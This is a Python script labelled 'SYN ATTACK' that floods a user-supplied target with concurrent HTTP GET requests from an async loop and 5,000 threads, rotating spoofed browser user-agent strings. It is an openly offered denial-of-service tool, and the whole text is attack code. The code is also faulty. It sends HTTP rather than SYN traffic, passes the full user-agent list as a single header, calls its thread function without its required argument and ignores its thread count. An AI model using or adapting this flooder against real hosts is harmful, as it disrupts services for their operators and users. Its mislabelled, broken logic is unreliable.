import asyncio
import aiohttp
import requests
import threading

print("")
print("SYN ATTACK")
host = input("Host : ")

user_agent = [
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
]

data = {'key': 'value'}

async def send_packet(session, user_agent):
  headers = {"User-Agent": user_agent}
  async with session.get(host, headers=headers) as response:
    if response.status == 200:
      print("Packet DOne")
    else: 
      print("Target Seized")

async def main():
  num_packet = int(input("Num Attack : "))
  num_thread = int(input("Thread : "))

  thread1 = []
  async with aiohttp.ClientSession() as session:
    for attack in range(num_packet):
      socket = asyncio.ensure_future(send_packet(session, user_agent))
      thread1.append(socket)

    await asyncio.gather(*thread1)

def mode_sock(host):
  response = requests.get(host)
  print("RRANDOM CHOICE")

if __name__ == '__main__':
  loop = asyncio.get_event_loop()
  loop.run_until_complete(main())
  num_bottom = 5000

  bot = []
  for i in range(num_bottom):
    task = threading.Thread(target=mode_sock)
    bot.append(task)
    task.start()

  for task in bot:
    task.join()
